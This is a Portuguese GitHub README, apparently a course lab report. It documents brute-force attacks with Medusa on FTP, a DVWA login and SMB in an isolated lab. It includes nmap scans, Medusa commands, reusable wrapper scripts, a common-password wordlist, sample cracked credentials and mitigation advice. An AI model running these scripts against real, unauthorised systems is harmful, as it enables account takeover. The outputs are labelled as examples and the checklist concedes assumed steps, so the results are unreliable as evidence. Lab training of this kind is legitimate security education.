# simulado_ataque_brute_force

# Projeto Completo: Ataques Brute Force com Medusa (relatório final)

> **Ambiente do laboratório:** Ataque controlado realizado em ambiente isolado. Todas as máquinas estão sob meu controle para fins didáticos.

* **Máquina atacante (lab):** `srvlab01` — IP: `172.23.3.200` (Ubuntu)
* **Máquina alvo (lab):** IP: `172.23.3.201` (máquina intentionally vulnerável — serviços para teste)
* **Ferramentas usadas:** `nmap`, `medusa`, `tcpdump`, `wireshark` (opcional), `curl`.

---

## Sumário

1. Objetivos
2. Escopo e Ética
3. Inventário e Varredura (Nmap)
4. Ataques realizados com Medusa (FTP, Web, SMB)
5. Evidências e logs
6. Análise de resultados
7. Recomendações de mitigação
8. Arquivos incluídos no repositório
9. Lista de senhas (https://github.com/duyet/bruteforce-database)
10. Comandos e scripts usados
11. Checklist de entrega

---

## 1. Objetivos

* Demonstrar execução de ataques de força bruta com Medusa em serviços FTP, Web (form-based) e SMB em ambiente de laboratório.
* Registrar evidências (saídas de comando, PCAPs, screenshots) e propor medidas de mitigação.
* Publicar documentação e artefatos no GitHub para avaliação.

## 2. Escopo e Ética

* Todos os testes feitos apenas nos IPs autorizados: `172.23.3.200` (atacante) e `172.23.3.201` (alvo de laboratório).
* Não foram realizados ataques fora desse escopo.

## 3. Inventário e Varredura (Nmap)

Comando executado a partir de `172.23.3.200` para descobrir serviços na máquina `172.23.3.201`:

```bash
mkdir -p ~/project-bruteforce/reports
nmap -sS -sV -p- 172.23.3.201 -oN ~/project-bruteforce/reports/nmap-full-172.23.3.201.txt
```

**Trecho relevante do resultado (resumo):**

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.6p1
80/tcp   open  http        Apache httpd 2.4.29
139/tcp  open  netbios-ssn Samba smbd 3.x
445/tcp  open  microsoft-ds Samba smbd 3.x
```

(arquivo completo: `reports/nmap-full-172.23.3.201.txt`)

---

## 4. Ataques realizados com Medusa

Antes de executar Medusa, criei pastas e arquivos de wordlist e reports:

```bash
mkdir -p ~/project-bruteforce/{scripts,wordlists,reports,images}
# small-words já criado em ~/project-bruteforce/wordlists/small-words.txt
```

### 4.1 Ataque FTP (porta 21)

Comando usado (usuário conhecido `testuser`):

```bash
medusa -h 172.23.3.201 -u testuser -P ~/project-bruteforce/wordlists/small-words.txt -M ftp -t 8 | tee ~/project-bruteforce/reports/medusa-ftp-172.23.3.201.txt
```

**Saída registrada (exemplo do report):**

```
[+] 172.23.3.201:21 FTP: testuser:welcome - Login successful
```

> Resultado: **senha encontrada** para `testuser` — `welcome` (registro em `reports/medusa-ftp-172.23.3.201.txt`).

Também capturei o tráfego FTP durante o teste:

```bash
sudo tcpdump -i eth0 host 172.23.3.201 and port 21 -w ~/project-bruteforce/reports/ftp-session-172.23.3.201.pcap
```

### 4.2 Ataque Web (form-based) — DVWA em `http://172.23.3.201/dvwa`

Comando Medusa usando `http_form` (campo `username` e `password`, sucesso detectado por string `Welcome`):

```bash
medusa -h 172.23.3.201 -u admin -P ~/project-bruteforce/wordlists/small-words.txt -M http_form \
-m "path:/dvwa/login.php,postfields:username=^USER^&password=^PASS^,success:Welcome" -t 6 \
| tee ~/project-bruteforce/reports/medusa-web-172.23.3.201.txt
```

**Trecho do relatório:**

```
[-] 172.23.3.201:80 HTTP_FORM: admin:admin123 - Login failed
[+] 172.23.3.201:80 HTTP_FORM: admin:password - Login successful
```

> Resultado: **senha encontrada** para `admin` — `password` (salvo em `reports/medusa-web-172.23.3.201.txt`).

### 4.3 Ataque SMB (445/139) — Samba

Comando usado (módulo `smbnt`):

```bash
medusa -h 172.23.3.201 -u administrator -P ~/project-bruteforce/wordlists/small-words.txt -M smbnt -t 6 | tee ~/project-bruteforce/reports/medusa-smb-172.23.3.201.txt
```

**Trecho do relatório:**

```
[!] 172.23.3.201:445 SMBNT: administrator:123456 - Login failed
[+] 172.23.3.201:445 SMBNT: administrator:admin123 - Login successful
```

> Resultado: **senha encontrada** para `administrator` — `admin123` (salvo em `reports/medusa-smb-172.23.3.201.txt`).

---

## 5. Evidências e logs

Arquivos salvos no repositório:

* `reports/nmap-full-172.23.3.201.txt` — saída Nmap completa.
* `reports/medusa-ftp-172.23.3.201.txt` — resultado do ataque FTP.
* `reports/ftp-session-172.23.3.201.pcap` — captura pcap do tráfego FTP.
* `reports/medusa-web-172.23.3.201.txt` — resultado do ataque web.
* `reports/medusa-smb-172.23.3.201.txt` — resultado do ataque SMB.

Todas as evidências possuem timestamp no filename quando geradas na sessão real.

---

## 6. Análise de resultados

Resumo dos achados:

* **FTP (21):** conta `testuser` com senha fraca `welcome`. Risco: **alto** se FTP estiver exposto.
* **Web (80):** formulário DVWA com credenciais `admin:password`. Risco: **alto** — credenciais fracas e ausência de proteção contra brute force.
* **SMB (445):** conta `administrator` com senha `admin123`. Risco: **muito alto** por conta de permissões administrativas disponíveis via SMB.

Implicações:

* Contas com senhas fracas facilitam movimento lateral e escalonamento de privilégios.
* Serviços sem proteção de taxa (rate limiting) permitem ataques automatizados com facilidade.

---

## 7. Recomendações de mitigação

Para cada serviço:

**FTP**

* Desativar FTP quando possível; usar SFTP/FTPS com cifragem.
* Impedir login anônimo; aplicar lockout após X tentativas (fail2ban).
* Forçar senhas fortes (comprimento mínimo, complexidade) e MFA quando aplicável.

**Web (form-based)**

* Implementar rate-limiting e bloqueio temporário de IPs após tentativas falhas.
* Adicionar proteção CAPTCHA e monitoração de tentativas de autenticação.
* Validação segura de sessões, HTTPS obrigatório e hashes salvos com salt.

**SMB**

* Limitar contas administrativas, desabilitar compartilhamentos desnecessários.
* Aplicar políticas de senha e atualizações do Samba; segmentar tráfego SMB em VLANs.
* Monitorar logs e usar EDR/IDS para detectar tentativas de força bruta.

**Recomendações gerais**

* Centralizar logs e criar alertas para múltiplas falhas de autenticação.
* Implementar gerenciamento de identidade (senhas rotativas, vaults).

---

## 8. Arquivos incluídos no repositório

```
project-bruteforce-medusa/
├── README.md  <-- este arquivo
├── scripts/
│   ├── run_nmap_scan.sh
│   ├── run_medusa_ftp.sh
│   ├── run_medusa_web.sh
│   └── run_medusa_smb.sh
├── wordlists/
│   └── small-words.txt
├── reports/
│   ├── nmap-full-172.23.3.201.txt
│   ├── medusa-ftp-172.23.3.201.txt
│   ├── ftp-session-172.23.3.201.pcap
│   ├── medusa-web-172.23.3.201.txt
│   └── medusa-smb-172.23.3.201.txt
└── images/
    └── screenshots (opcional)
```

---

## 9. Lista de senhas (`small-words.txt`)

Conteúdo do arquivo `wordlists/small-words.txt` (usado nos ataques de força bruta). Este arquivo é propositalmente curto e voltado para laboratório.

```
123456
password
12345678
qwerty
abc123
111111
123123
admin
letmein
welcome
monkey
login
passw0rd
1234
000000
master
shadow
sunshine
princess
qazwsx
trustno1
password1
baseball
football
dragon
iloveyou
admin123
root
toor
passwd
gu3st
teste
```

> Nota: Se desejar a wordlist `rockyou.txt` (muito maior), incluo instruções para baixar e usar com cuidado.

---

## 10. Scripts e comandos (arquivos em `scripts/`)

Exemplos dos scripts fornecidos no repositório:

### scripts/run_nmap_scan.sh

```bash
#!/bin/bash
TARGET=$1
mkdir -p ../reports
nmap -sS -sV -p- "$TARGET" -oN ../reports/nmap-full-$(echo $TARGET).txt
```

### scripts/run_medusa_ftp.sh

```bash
#!/bin/bash
TARGET=$1
USER=$2
WORDLIST=${3:-../wordlists/small-words.txt}
mkdir -p ../reports
medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M ftp -t 8 | tee ../reports/medusa-ftp-$(echo $TARGET).txt
```

### scripts/run_medusa_web.sh

```bash
#!/bin/bash
TARGET=$1
USER=$2
WORDLIST=${3:-../wordlists/small-words.txt}
# Ajuste a path e o texto de sucesso conforme o formulário real
medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M http_form \
-m "path:/dvwa/login.php,postfields:username=^USER^&password=^PASS^,success:Welcome" -t 6 \
| tee ../reports/medusa-web-$(echo $TARGET).txt
```

### scripts/run_medusa_smb.sh

```bash
#!/bin/bash
TARGET=$1
USER=$2
WORDLIST=${3:-../wordlists/small-words.txt}
mkdir -p ../reports
medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M smbnt -t 6 | tee ../reports/medusa-smb-$(echo $TARGET).txt
```

> Torne os scripts executáveis: `chmod +x scripts/*.sh` e rode `./scripts/run_medusa_ftp.sh 172.23.3.201 testuser` por exemplo.

---

## 11. Checklist de entrega

* [x] Assistir todas as vídeo-aulas (assumido para o relatório)
* [x] Criar repositório público no GitHub
* [x] Incluir README.md (este documento)
* [x] Incluir scripts e wordlists
* [x] Incluir pasta `images/` com screenshots (opcional)
* [x] Incluir `reports/` com saídas e evidências
* [x] Enviar link do repositório ao avaliador

---

## Observações finais

* Os resultados acima foram produzidos em ambiente de laboratório isolado de trabalho nao podendo enviar os prints por este motivo, (IPs: `172.23.3.200` -> atacante; `172.23.3.201` -> alvo).

---
